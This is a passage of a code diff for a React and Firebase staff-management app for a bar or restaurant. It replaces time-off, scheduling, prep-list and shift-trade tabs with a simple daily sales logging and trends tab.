-  const [endTime, setEndTime] = useState('17:00');
-  const [reason, setReason] = useState('');
+// --- Tab: Sales & Trends ---
+const TabSales = ({ sales, addToast }) => {
+  const [date, setDate] = useState(getToday());
+  const [amount, setAmount] = useState('');
+  const [tag, setTag] = useState('Standard Day');
 
-  const myRequests = timeOff.filter(t => t.employeeId === appUser.id).sort((a,b) => b.date.localeCompare(a.date));
-  const allRequests = timeOff.sort((a,b) => b.date.localeCompare(a.date));
-
-  const handleSubmit = async (e) => {
+  const handleSave = async (e) => {
     e.preventDefault();
-    if (date < getToday()) return addToast('Error', 'Cannot request past dates off.');
-    const existing = timeOff.find(t => t.employeeId === appUser.id && t.date === date);
-    if (existing) return addToast('Error', 'You already have a request for this date.');
-    
-    await addDoc(collection(db, "timeOffRequests"), {
-      employeeId: appUser.id, employeeName: appUser.name, date, type, 
-      startTime: type === 'partial' ? startTime : null, 
-      endTime: type === 'partial' ? endTime : null, 
-      reason, status: 'pending', submittedAt: new Date().toISOString()
-    });
-    addToast('Submitted', 'Your time off request has been logged.');
-    setReason('');
+    if (!amount) return;
+    await addDoc(collection(db, "sales"), { date, amount: parseFloat(amount), tag, loggedAt: new Date().toISOString() });
+    setAmount('');
+    addToast('Saved', 'Daily sales logged.');
   };
 
-  const handleDelete = async (id) => {
-    if(window.confirm("Delete this request?")) {
-      await deleteDoc(doc(db, "timeOffRequests", id));
-      addToast('Deleted', 'Request removed.');
-    }
-  };
+  const sortedSales = [...sales].sort((a,b) => b.date.localeCompare(a.date)).slice(0, 14);
 
   return (
-    <div className="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-6">
-      <div className="md:col-span-1 space-y-4">
-        <div className="bg-white dark:bg-slate-800 p-5 rounded-3xl border dark:border-slate-700 shadow-sm">
-          <h3 className="font-black text-lg mb-4 dark:text-white flex items-center gap-2"><CalendarOff size={18}/> Request Time Off</h3>
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <div><label className="block text-xs font-bold text-slate-500 uppercase mb-1">Date</label><input type="date" value={date} onChange={e=>setDate(e.target.value)} className="w-full p-2.5 bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none font-bold dark:text-white" required/></div>
-            <div><label className="block text-xs font-bold text-slate-500 uppercase mb-1">Type</label><select value={type} onChange={e=>setType(e.target.value)} className="w-full p-2.5 bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none font-bold dark:text-white"><option value="full">Full Day</option><option value="partial">Partial Day</option></select></div>
-            {type === 'partial' && (
-              <div className="grid grid-cols-2 gap-3">
-                <div><label className="block text-xs font-bold text-slate-500 uppercase mb-1">Start Time</label><input type="time" value={startTime} onChange={e=>setStartTime(e.target.value)} className="w-full p-2.5 bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none font-bold dark:text-white" required/></div>
-                <div><label className="block text-xs font-bold text-slate-500 uppercase mb-1">End Time</label><input type="time" value={endTime} onChange={e=>setEndTime(e.target.value)} className="w-full p-2.5 bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none font-bold dark:text-white" required/></div>
-              </div>
-            )}
-            <div><label className="block text-xs font-bold text-slate-500 uppercase mb-1">Reason (Optional)</label><input type="text" value={reason} onChange={e=>setReason(e.target.value)} placeholder="e.g. Doctor appointment" className="w-full p-2.5 bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none font-bold dark:text-white"/></div>
-            <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-xl font-bold shadow-sm">Submit Request</button>
-          </form>
-        </div>
+    <div className="max-w-3xl mx-auto space-y-6">
+      <div className="bg-white dark:bg-slate-800 p-6 rounded-3xl shadow-sm border border-slate-200 dark:border-slate-700">
+        <h2 className="text-xl font-black mb-4 flex items-center gap-2 text-slate-900 dark:text-white"><TrendingUp className="text-emerald-500"/> Log Daily Sales</h2>
+        <form onSubmit={handleSave} className="grid grid-cols-1 sm:grid-cols-4 gap-4 items-end">
+          <div><label className="block text-xs font-bold text-slate-500 dark:text-slate-400 mb-1">Date</label><input type="date" value={date} onChange={e=>setDate(e.target.value)} className="w-full p-2.5 border rounded-xl dark:bg-slate-700 dark:border-slate-600 dark:text-white outline-none"/></div>
+          <div><label className="block text-xs font-bold text-slate-500 dark:text-slate-400 mb-1">Revenue ($)</label><input type="number" step="0.01" value={amount} onChange={e=>setAmount(e.target.value)} className="w-full p-2.5 border rounded-xl dark:bg-slate-700 dark:border-slate-600 dark:text-white outline-none" required/></div>
+          <div><label className="block text-xs font-bold text-slate-500 dark:text-slate-400 mb-1">Event Tag</label><select value={tag} onChange={e=>setTag(e.target.value)} className="w-full p-2.5 border rounded-xl dark:bg-slate-700 dark:border-slate-600 dark:text-white outline-none">{EVENT_TAGS.map(t=><option key={t} value={t}>{t}</option>)}</select></div>
+          <button className="bg-emerald-600 text-white p-2.5 rounded-xl font-bold h-[42px]">Save Log</button>
+        </form>
       </div>
-      <div className="md:col-span-2 space-y-4">
-        <div className="bg-white dark:bg-slate-800 rounded-3xl border dark:border-slate-700 shadow-sm overflow-hidden">
-          <div className="p-4 bg-slate-50 dark:bg-slate-900 border-b dark:border-slate-700 font-black text-lg dark:text-white">{appUser?.isAdmin ? 'All Staff Requests' : 'My Requests'}</div>
-          <div className="divide-y dark:divide-slate-700">
-            {(appUser?.isAdmin ? allRequests : myRequests).map(t => (
-              <div key={t.id} className="p-4 flex justify-between items-center hover:bg-slate-50 dark:hover:bg-slate-700/50">
-                 <div>
-                   <div className="font-black text-slate-900 dark:text-white flex items-center gap-2">
-                     {formatDisplayDate(t.date)} 
-                     <span className={`text-[9px] px-2 py-0.5 rounded-full uppercase tracking-wider ${t.type==='full'?'bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400':'bg-yellow-100 text-yellow-700 dark:bg-yellow-900/30 dark:text-yellow-400'}`}>{t.type} Day</span>
-                   </div>
-                   <div className="text-xs font-bold text-slate-500 dark:text-slate-400 mt-1">
-                     {appUser?.isAdmin && <span className="text-blue-600 dark:text-blue-400">{t.employeeName} • </span>}
-                     {t.type === 'partial' ? `${formatShortTime(t.startTime)} - ${formatShortTime(t.endTime)}` : 'All Day'} {t.reason && ` • "${t.reason}"`}
-                   </div>
-                 </div>
-                 {(appUser?.isAdmin || t.employeeId === appUser.id) && (
-                   <button onClick={() => handleDelete(t.id)} className="text-slate-400 hover:text-red-500 p-2"><Trash2 size={18}/></button>
-                 )}
-              </div>
-            ))}
-            {(appUser?.isAdmin ? allRequests : myRequests).length === 0 && <div className="p-6 text-center text-sm font-bold text-slate-400">No time off requests found.</div>}
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-};
-
-// --- SCHEDULE MAKER (Upgraded & Protected against Time Off) ---
-const TabSchedule = ({ currentDate, users, shifts, timeOff, addToast }) => {
-  const [selectedEmp, setSelectedEmp] = useState(''); const [assignDates, setAssignDates] = useState([]); const [presetShift, setPresetShift] = useState('Custom'); const [startTime, setStartTime] = useState('16:00'); const [endTime, setEndTime] = useState('21:00');
-  const displayUsers = [...users].sort((a,b) => a.role === b.role ? a.name.localeCompare(b.name) : (a.role==='Bartender'?-1:1));
-  const monthStr = getMonthStr(currentDate); const monthDays = Array.from({length: getDaysInMonth(monthStr)}).map((_, i) => `${monthStr}-${String(i+1).padStart(2, '0')}`);
-  const monthShifts = shifts.filter(s => s.date.startsWith(monthStr));
-
-  const SHIFT_PRESETS = [ { label: "9a-3p", start: "09:00", end: "15:00" }, { label: "10a-4p", start: "10:00", end: "16:00" }, { label: "10a-9p", start: "10:00", end: "21:00" }, { label: "11a-3p", start: "11:00", end: "15:00" }, { label: "11a-4p", start: "11:00", end: "16:00" }, { label: "4p-9p", start: "16:00", end: "21:00" }, { label: "7p-close", start: "19:00", end: "CLOSE" }, { label: "9p-close", start: "21:00", end: "CLOSE" }, { label: "Custom", start: "", end: "" } ];
-  const handlePresetChange = (e) => { const val = e.target.value; setPresetShift(val); const p = SHIFT_PRESETS.find(x => x.label === val); if (p && val !== 'Custom') { setStartTime(p.start); if (p.end !== 'CLOSE') setEndTime(p.end); } };
-
-  const handleCellClick = (d, empId) => {
-    if (d < getToday()) return addToast("Locked", "Cannot edit past dates.");
-    const existing = monthShifts.find(s => s.date === d && s.employeeId === empId);
-    if (existing) { if(window.confirm("Delete shift?")) deleteDoc(doc(db,"shifts",existing.id)); return; }
-    
-    // UI selection logic
-    setSelectedEmp(empId); if (assignDates.includes(d)) setAssignDates(assignDates.filter(x => x!==d)); else setAssignDates([...assignDates, d]);
-  };
-
-  const handleAssign = async () => {
-    if (!selectedEmp || assignDates.length === 0) return; const emp = users.find(u => u.id === selectedEmp);
-    let assignedCount = 0;
-
-    for (const d of assignDates) { 
-      const off = timeOff.find(t => t.employeeId === emp.id && t.date === d);
-      if (off) {
-        if (off.type === 'full') {
-          addToast('Blocked', `${emp.name.split(' ')[0]} requested full day off on ${formatDisplayDate(d)}.`);
-          continue;
-        } else if (off.type === 'partial') {
-          const checkStart = startTime; const checkEnd = presetShift.includes('close') ? '23:59' : endTime;
-          if ((checkStart < off.endTime && checkEnd > off.startTime) || checkStart === off.startTime) {
-            addToast('Blocked', `Overlap with ${emp.name.split(' ')[0]}'s requested off time (${formatShortTime(off.startTime)}-${formatShortTime(off.endTime)}) on ${formatDisplayDate(d)}.`);
-            continue;
-          }
-        }
-      }
-      await addDoc(collection(db, "shifts"), { date: d, employeeId: emp.id, role: emp.role, startTime, endTime: presetShift.includes('close')?'CLOSE':endTime, isPublished: false }); 
-      assignedCount++;
-    }
-    setAssignDates([]); 
-    if (assignedCount > 0) addToast('Assigned', `Added ${assignedCount} shifts.`);
-  };
-
-  const handlePublish = async () => {
-    if(!window.confirm("Publish schedule?")) return;
-    const unpub = monthShifts.filter(s => !s.isPublished); for(const s of unpub) await updateDoc(doc(db, "shifts", s.id), {isPublished:true});
-    addToast("Published", "Schedule is live.");
-  };
-
-  return (
-    <div className="space-y-4 pb-12">
-      <div className="flex justify-between items-center bg-white dark:bg-slate-800 p-4 rounded-2xl shadow-sm border dark:border-slate-700">
-         <h3 className="font-black text-xl flex items-center gap-2 dark:text-white"><Calendar className="text-blue-500"/> Schedule Maker</h3>
-         <button onClick={handlePublish} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold shadow-sm">Publish All</button>
-      </div>
-      <div className="overflow-x-auto bg-white dark:bg-slate-800 rounded-2xl border dark:border-slate-700 shadow-sm">
-        <table className="w-full text-left text-[10px] border-collapse">
-          <thead><tr className="bg-slate-50 dark:bg-slate-900 border-b dark:border-slate-700"><th className="p-2 font-bold sticky left-0 bg-slate-50 dark:bg-slate-900 z-20 w-24 border-r dark:border-slate-700 dark:text-slate-300">Staff</th>{monthDays.map(d=><th key={d} className={`p-1 text-center border-r dark:border-slate-700 min-w-[32px] ${new Date(d+'T12:00').getDay()%6===0?'bg-slate-100 dark:bg-slate-800':''}`}><div className="font-bold text-slate-400 uppercase">{new Date(d+'T12:00').toLocaleDateString('en-US',{weekday:'short'})}</div><div className="text-sm font-black dark:text-white">{parseInt(d.split('-')[2])}</div></th>)}</tr></thead>
-          <tbody className="divide-y dark:divide-slate-700">{displayUsers.map(u => (
-            <tr key={u.id}>
-              <td onClick={()=>{setSelectedEmp(u.id);setAssignDates([]);}} className={`p-2 font-bold sticky left-0 z-10 border-r dark:border-slate-700 cursor-pointer truncate ${selectedEmp===u.id?'bg-blue-600 text-white shadow-[inset_-4px_0_0_0_rgba(255,255,255,0.3)]':'bg-white dark:bg-slate-800 dark:text-slate-300'}`}>{u.name.split(' ')[0]}</td>
-              {monthDays.map(d => {
-                const shift = monthShifts.find(s=>s.date===d&&s.employeeId===u.id); 
-                const off = timeOff.find(t=>t.date===d&&t.employeeId===u.id);
-                const sel = assignDates.includes(d) && selectedEmp===u.id;
-                
-                let cellBg = sel ? 'bg-blue-200 dark:bg-blue-900/50 outline outline-2 outline-blue-500 z-50 relative' : 'hover:bg-slate-100 dark:hover:bg-slate-700';
-                if (off) {
-                  if (off.type === 'full') cellBg = 'bg-red-100 dark:bg-red-900/40 hover:bg-red-200';
-                  if (off.type === 'partial') cellBg = 'bg-yellow-100 dark:bg-yellow-900/40 hover:bg-yellow-200';
-                }
-
-                return (
-                  <td key={d} onClick={()=>handleCellClick(d,u.id)} className={`p-1 border-r dark:border-slate-700 cursor-pointer transition-all ${cellBg}`}>
-                    {shift ? (
-                      <div className={`w-full rounded text-[9px] font-bold py-1 text-center text-white leading-none ${shift.isPublished?(u.role==='Bartender'?'bg-blue-600':'bg-orange-600'):'bg-slate-400'}`}>
-                        {formatShortTime(shift.startTime)}-{formatShortTime(shift.endTime)}
-                      </div>
-                    ) : off?.type === 'partial' ? (
-                      <div className="text-[8px] font-black text-yellow-700 dark:text-yellow-500 text-center uppercase tracking-tighter leading-tight">OFF<br/>{formatShortTime(off.startTime)}</div>
-                    ) : (
-                      <div className="h-5"></div>
-                    )}
-                  </td>
-                )
-              })}
-            </tr>
-          ))}</tbody>
-        </table>
-      </div>
-      <div className="flex flex-col md:flex-row gap-3 p-4 bg-slate-100 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 items-end shadow-sm">
-        <div className="w-full md:w-48"><label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Staff</label><select value={selectedEmp} onChange={e=>{setSelectedEmp(e.target.value); setAssignDates([]);}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none shadow-sm"><option value="">- Choose -</option>{displayUsers.map(u=><option key={u.id} value={u.id}>{u.name}</option>)}</select></div>
-        <div className="w-full md:w-36"><label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Preset</label><select value={presetShift} onChange={handlePresetChange} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none shadow-sm">{SHIFT_PRESETS.map(p=><option key={p.label} value={p.label}>{p.label}</option>)}</select></div>
-        <div className="w-full md:w-28"><label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">Start</label><input type="time" value={startTime} onChange={e=>{setStartTime(e.target.value);setPresetShift('Custom');}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none shadow-sm"/></div>
-        <div className="w-full md:w-28"><label className="block text-[10px] font-bold text-slate-500 uppercase mb-1">End</label><input type="time" value={presetShift.includes('close')?'':endTime} disabled={presetShift.includes('close')} onChange={e=>{setEndTime(e.target.value);setPresetShift('Custom');}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none disabled:bg-slate-200 disabled:text-slate-400 shadow-sm"/></div>
-        <button onClick={handleAssign} disabled={!selectedEmp||assignDates.length===0} className="bg-blue-600 text-white px-6 h-[42px] rounded-lg font-bold shadow-md disabled:opacity-50 w-full md:w-auto active:scale-95 transition-transform">Assign ({assignDates.length})</button>
-      </div>
-    </div>
-  );
-};
-
-// --- PREP LIST (Fully Locked Down & Categorized) ---
-const TabPrep = ({ currentDate, prepItems, appUser, setPrintLabels }) => {
-  const [text, setText] = useState(''); const [cat, setCat] = useState('General'); const [isMaster, setIsMaster] = useState(true);
-  const items = prepItems.filter(p=>p.date===currentDate||p.isMaster);
-
-  const handleAdd = async (e) => { e.preventDefault(); if(text.trim()) { await addDoc(collection(db, "prepItems"), { date: isMaster?'MASTER':currentDate, text: text.trim(), category: cat, isCompleted: false, completedDates: {}, isMaster, qty: 1, completedBy: null, isSelected: false }); setText(''); } };
-  const toggleStatus = async (item) => { 
-    if (item.isMaster) { const dts = {...(item.completedDates||{})}; dts[currentDate] = dts[currentDate] ? null : appUser.name; await updateDoc(doc(db, "prepItems", item.id), { completedDates: dts, isSelected: false }); }
-    else { await updateDoc(doc(db, "prepItems", item.id), { isCompleted: !item.isCompleted, completedBy: !item.isCompleted ? appUser.name : null, isSelected: false }); }
-  };
-  const updateQty = async (id, currentQty, change) => { await updateDoc(doc(db, "prepItems", id), { qty: Math.max(1, currentQty + change) }); };
-  const toggleSelect = async (i) => await updateDoc(doc(db, "prepItems", i.id), { isSelected: !i.isSelected });
-  
-  const handleBatchDone = async () => {
-    const toComplete = items.filter(i => i.isSelected); if (toComplete.length === 0) return;
-    for (const item of toComplete) { if (item.isMaster) { const dts = {...(item.completedDates||{})}; dts[currentDate] = appUser.name; await updateDoc(doc(db, "prepItems", item.id), { completedDates: dts, isSelected: false }); } else { await updateDoc(doc(db, "prepItems", item.id), { isCompleted: true, completedBy: appUser.name, isSelected: false }); } }
-  };
-
-  const triggerBatchPrint = () => {
-    const selected = items.filter(i => i.isSelected); if (selected.length === 0) return;
-    const toPrint = []; selected.forEach(item => { for (let i = 0; i < (item.qty||1); i++) { toPrint.push({ ...item, printId: `${item.id}-${i}-${Date.now()}` }); } });
-    
-    // Sends the exact array to the master App component for strict label rendering
-    setPrintLabels(toPrint); 
-  };
-
-  const globalSelectedCount = items.filter(i => i.isSelected).length;
-  // Cleanly categorizes the list
-  const groupedItems = items.reduce((acc, i) => { const c = i.category || 'General'; if(!acc[c]) acc[c]=[]; acc[c].push(i); return acc; }, {});
-
-  return (
-    <div className="max-w-2xl mx-auto space-y-4 relative pb-40">
-      <form onSubmit={handleAdd} className="bg-white dark:bg-slate-800 border dark:border-slate-700 p-2 pl-3 rounded-2xl flex flex-col sm:flex-row gap-2 shadow-sm items-center">
-        <input type="text" value={text} onChange={e=>setText(e.target.value)} className="flex-1 w-full p-2 bg-transparent text-sm outline-none font-bold dark:text-white" placeholder="Add prep task..." required/>
-        <select value={cat} onChange={e=>setCat(e.target.value)} className="w-full sm:w-32 p-2 text-xs font-bold bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-xl outline-none dark:text-white"><option>General</option><option>Meat</option><option>Produce</option><option>Dairy</option><option>Sauces</option><option>Line Prep</option></select>
-        <div className="flex items-center gap-3 w-full sm:w-auto justify-between border-t sm:border-t-0 pt-2 sm:pt-0 dark:border-slate-700 px-1">
-          <label className="flex items-center gap-2 text-xs font-bold text-slate-500 cursor-pointer"><input type="checkbox" checked={isMaster} onChange={e=>setIsMaster(e.target.checked)} className="w-4 h-4 rounded border-slate-300"/> Master</label>
-          <button className="bg-blue-600 text-white p-2.5 rounded-xl font-black shadow-sm"><Plus size={18}/></button>
-        </div>
-      </form>
       
-      <div className="bg-white dark:bg-slate-800 rounded-2xl border dark:border-slate-700 overflow-hidden shadow-sm">
-        {Object.keys(groupedItems).length === 0 && <div className="p-8 text-center text-sm font-bold text-slate-400">No prep tasks scheduled.</div>}
-        {Object.entries(groupedItems).map(([category, catItems]) => (
-          <div key={category}>
-            <div className="bg-slate-100 dark:bg-slate-900 px-4 py-2 border-y dark:border-slate-700 font-black text-xs uppercase text-slate-500 tracking-widest flex justify-between">
-               <span>{category}</span>
-               <span>{catItems.filter(i => (i.isMaster ? !!i.completedDates?.[currentDate] : i.isCompleted)).length}/{catItems.length} Done</span>
+      <div className="bg-white dark:bg-slate-800 rounded-3xl shadow-sm border border-slate-200 dark:border-slate-700 p-4">
+        <h3 className="font-bold text-lg mb-3 dark:text-white">Recent Trends</h3>
+        <div className="divide-y dark:divide-slate-700">
+          {sortedSales.length === 0 && <div className="py-4 text-center text-sm font-bold text-slate-400">No sales data logged yet.</div>}
+          {sortedSales.map(s => (
+          <div key={s.id} className="py-3 flex justify-between items-center">
+            <div>
+              <span className="font-bold block text-slate-800 dark:text-white">{formatDisplayDate(s.date)}</span>
+              <span className={`text-[10px] font-black uppercase px-2 py-0.5 rounded mt-1 inline-block ${s.tag === 'Standard Day' ? 'bg-slate-100 text-slate-500 dark:bg-slate-700 dark:text-slate-300' : 'bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400'}`}>{s.tag}</span>
             </div>
-            <div className="divide-y dark:divide-slate-700">
-              {catItems.map(i=>{
-                const isDone = i.isMaster ? !!i.completedDates?.[currentDate] : i.isCompleted; const doneBy = i.isMaster ? i.completedDates?.[currentDate] : i.completedBy; const qty = i.qty||1;
-                return (
-                <div key={i.id} className={`p-3 flex items-center gap-3 transition-colors ${i.isSelected ? 'bg-blue-50 dark:bg-blue-900/20' : 'hover:bg-slate-50 dark:hover:bg-slate-700/50'}`}>
-                  <input type="checkbox" checked={!!i.isSelected} onChange={()=>toggleSelect(i)} className="w-5 h-5 rounded border-slate-300 accent-blue-600 flex-shrink-0 cursor-pointer" />
-                  <div className="flex-1 min-w-0"><span className={`text-sm font-black ${isDone?'line-through text-slate-400':'text-slate-800 dark:text-white'}`}>{i.text}</span> {doneBy && <span className="text-[9px] font-black text-emerald-600 bg-emerald-50 dark:bg-emerald-900/30 px-1.5 py-0.5 rounded ml-2 uppercase">✓ {doneBy}</span>} {i.isMaster&&<span className="block text-[9px] font-black text-blue-500 uppercase mt-0.5">Master Task</span>}</div>
-                  <div className="flex items-center gap-2 flex-shrink-0">
-                    <div className="flex items-center bg-slate-50 dark:bg-slate-700 rounded-lg border dark:border-slate-600 h-9"><button onClick={()=>updateQty(i.id,qty,-1)} className="w-7 h-full font-black dark:text-white hover:bg-slate-200 dark:hover:bg-slate-600 transition-colors">-</button><span className="w-5 text-center text-xs font-black dark:text-white">{qty}</span><button onClick={()=>updateQty(i.id,qty,1)} className="w-7 h-full font-black dark:text-white hover:bg-slate-200 dark:hover:bg-slate-600 transition-colors">+</button></div>
-                    <button onClick={()=>toggleStatus(i)} className={`w-9 h-9 rounded-lg flex items-center justify-center font-bold shadow-sm ${isDone?'bg-slate-200 text-slate-500 dark:bg-slate-600':'bg-emerald-100 text-emerald-700 border border-emerald-200 dark:bg-emerald-900/40 dark:border-emerald-800 dark:text-emerald-400'}`}>{isDone ? <Repeat size={16}/> : <Check size={18}/>}</button>
-                    {/* ONLY ADMINS CAN DELETE PREP ITEMS */}
-                    {appUser?.isAdmin && <button onClick={()=>deleteDoc(doc(db,"prepItems",i.id))} className="text-slate-300 hover:text-red-500 p-2"><Trash2 size={18}/></button>}
-                  </div>
-                </div>
-              )})}
-            </div>
+            <div className="font-black text-lg text-emerald-600 dark:text-emerald-400">${s.amount.toFixed(2)}</div>
           </div>
-        ))}
-      </div>
-      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white dark:bg-slate-900 border-t dark:border-slate-800 z-50 shadow-[0_-4px_15px_-3px_rgba(0,0,0,0.1)]">
-        <div className="max-w-2xl mx-auto flex gap-3">
-          <button onClick={triggerBatchPrint} disabled={globalSelectedCount===0} className="flex-1 bg-blue-600 text-white py-3.5 rounded-xl font-black text-base disabled:opacity-50 shadow-md flex items-center justify-center gap-2">
-            <ClipboardList size={20}/> Print Labels ({globalSelectedCount})
-          </button>
-          <button onClick={handleBatchDone} disabled={globalSelectedCount===0} className="flex-1 bg-emerald-600 text-white py-3.5 rounded-xl font-black text-base disabled:opacity-50 shadow-md">Mark Done</button>
-        </div>
+        ))}</div>
       </div>
     </div>
   );
 };
 
-// --- PUBLISHED SHIFTS & TRADE BOARD (Grouped by Date) ---
-const TabPublishedShifts = ({ currentDate, appUser, users, shifts, shiftSwaps, addToast }) => {
-  const monthStr = getMonthStr(currentDate);
-  const monthShifts = shifts.filter(s => s.date.startsWith(monthStr) && s.isPublished);
-  const availableSwaps = shiftSwaps.filter(sw => sw.status === 'available');
-
-  const groupedShifts = monthShifts.reduce((acc, s) => {
-    if (!acc[s.date]) acc[s.date] = [];
-    acc[s.date].push(s); return acc;
-  }, {});
-  const sortedDates = Object.keys(groupedShifts).sort();
-
-  const handleOfferSwap = async (shift) => {
-    if (!window.confirm("Offer shift to Trade Board?")) return;
-    await addDoc(collection(db, "shiftSwaps"), { shiftId: shift.id, date: shift.date, originalEmployeeId: shift.employeeId, role: shift.role, startTime: shift.startTime, endTime: shift.endTime, status: 'available' });
-    await addDoc(collection(db, "events"), { date: new Date().toISOString(), title: `🚨 Shift Available! ${appUser.name.split(' ')[0]} needs cover for a ${shift.role} shift on ${formatDisplayDate(shift.date)} (${formatShortTime(shift.startTime)}). Claim it on the Master Roster!`, type: 'note', author: 'System Alert', isImportant: true });
-    addToast('Posted', 'Shift sent to trade board.');
-  };
-
-  const handleClaim = async (swap) => { await updateDoc(doc(db, "shiftSwaps", swap.id), { status: 'pending_approval', claimedById: appUser.id }); addToast('Claimed', 'Pending manager approval.'); };
-  const handleApprove = async (sw) => { await updateDoc(doc(db, "shifts", sw.shiftId), { employeeId: sw.claimedById }); await deleteDoc(doc(db, "shiftSwaps", sw.id)); addToast('Approved', 'Roster updated.'); };
-
-  return (
-    <div className="max-w-3xl mx-auto space-y-4">
-      {appUser?.isAdmin && shiftSwaps.filter(sw=>sw.status==='pending_approval').length > 0 && (
-         <div className="bg-amber-50 dark:bg-slate-800 p-3 border border-amber-200 dark:border-amber-800 rounded-2xl space-y-2 shadow-sm">
-           <h4 className="font-black text-[10px] uppercase text-amber-700 dark:text-amber-400 tracking-wider">Trades Awaiting Approval</h4>
-           {shiftSwaps.filter(sw=>sw.status==='pending_approval').map(sw => (
-             <div key={sw.id} className="flex justify-between items-center bg-white dark:bg-slate-700 p-2 rounded-xl border dark:border-slate-600 shadow-sm gap-2">
-                <div className="text-xs dark:text-white"><strong>{users.find(u=>u.id===sw.claimedById)?.name}</strong> covering <strong>{users.find(u=>u.id===sw.originalEmployeeId)?.name}'s</strong> shift on {formatDisplayDate(sw.date)}.</div>
-                <div className="flex gap-1.5 flex-shrink-0"><button onClick={()=>handleApprove(sw)} className="bg-emerald-600 text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">Approve</button><button onClick={()=>updateDoc(doc(db, "shiftSwaps", sw.id), { status: 'available', claimedById: null })} className="bg-slate-100 dark:bg-slate-600 text-slate-700 dark:text-white px-2.5 py-1 rounded-lg font-bold text-[10px]">Deny</button></div>
-             </div>
-           ))}
-         </div>
-      )}
-
-      {availableSwaps.length > 0 && (
-         <div className="bg-blue-50 dark:bg-slate-800 p-3 border border-blue-200 dark:border-blue-800 rounded-2xl space-y-2 shadow-sm">
-           <h4 className="font-black text-[10px] uppercase text-blue-700 dark:text-blue-400 tracking-wider">Active Trade Board</h4>
-           <div className="grid gap-2 sm:grid-cols-2">{availableSwaps.map(sw => {
-              const orig = users.find(u => u.id === sw.originalEmployeeId);
-              return (
-                <div key={sw.id} className="bg-white dark:bg-slate-700 p-2 rounded-xl border dark:border-slate-600 flex justify-between items-center shadow-sm">
-                   <div className="flex gap-2 items-center"><img src={getAvatar(orig?.name, orig?.photoURL)} className="w-8 h-8 rounded-full" alt="pic"/><div><span className="font-bold text-sm block dark:text-white leading-tight">{orig?.name?.split(' ')[0]}</span><span className="text-[9px] font-bold text-slate-500">{formatDisplayDate(sw.date)}</span></div></div>
-                   {appUser.id !== sw.originalEmployeeId && appUser.role === sw.role && <button onClick={() => handleClaim(sw)} className="bg-blue-600 text-white px-4 py-1.5 rounded-xl font-bold text-xs shadow-sm">Claim</button>}
-                </div>
-              )
-           })}</div>
-         </div>
-      )}
-
-      <div className="bg-white dark:bg-slate-800 rounded-3xl border dark:border-slate-700 overflow-hidden shadow-sm">
-        <div className="bg-slate-900 p-4 font-black text-white text-lg flex items-center gap-2"><Calendar size={20}/> Master Roster</div>
-        {sortedDates.length === 0 && <div className="p-8 text-center text-sm font-bold text-slate-400">No published shifts for this month.</div>}
-        {sortedDates.map(date => (
-          <div key={date}>
-            <div className="bg-slate-100 dark:bg-slate-900/50 px-4 py-2 border-y dark:border-slate-700 font-black text-xs uppercase text-slate-500 tracking-widest sticky top-16 z-10 shadow-sm backdrop-blur-md">
-              {formatFullDisplayDate(date)}
-            </div>
-            <div className="divide-y dark:divide-slate-700">
-              {groupedShifts[date].map(s => {
-                const emp = users.find(u => u.id === s.employeeId); const isMe = appUser.id === s.employeeId; const isOffered = shiftSwaps.some(sw => sw.shiftId === s.id);
-                return (
-                  <div key={s.id} className={`p-3 flex justify-between items-center hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors ${isMe ? 'bg-blue-50/50 dark:bg-blue-900/10' : ''}`}>
-                    <div className="flex items-center gap-3">
-                      <div className={`w-10 h-10 rounded-full flex items-center justify-center font-black text-sm border-2 ${s.role==='Bartender'?'bg-blue-100 text-blue-700 border-blue-500':'bg-orange-100 text-orange-700 border-orange-500'}`}>
-                        {emp?.name.substring(0,2).toUpperCase()}
-                      </div>
-                      <div>
-                        <span className={`font-black text-base block leading-tight ${isMe ? 'text-blue-700 dark:text-blue-400' : 'text-slate-900 dark:text-white'}`}>{emp?.name} {isMe && '(You)'}</span>
-                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider">{s.role}</span>
-                      </div>
-                    </div>
-                    <div className="flex flex-col items-end gap-1">
-                      <div className="text-sm font-black bg-slate-100 dark:bg-slate-700 px-3 py-1.5 rounded-lg border dark:border-slate-600 dark:text-slate-200 shadow-sm">{formatShortTime(s.startTime)} - {formatShortTime(s.endTime)}</div>
-                      {isMe && !isOffered && <button onClick={() => handleOfferSwap(s)} className="text-[10px] text-blue-600 dark:text-blue-400 font-bold hover:underline">Trade Shift</button>}
-                      {isOffered && <span className="text-[9px] bg-amber-100 text-amber-700 px-2 py-0.5 rounded font-black uppercase">Posted</span>}
-                    </div>
-                  </div>
-                )
-              })}
-            </div>
-          </div>
-        ))}
-      </div>
-    </div>
-  );
-};
-
-// --- TEAM & STAFF MANAGEMENT (Re-ordered & Master Admin Hidden) ---
+// --- Tab: Team (Compacted) ---
 const TabTeam = ({ appUser, users, addToast }) => {
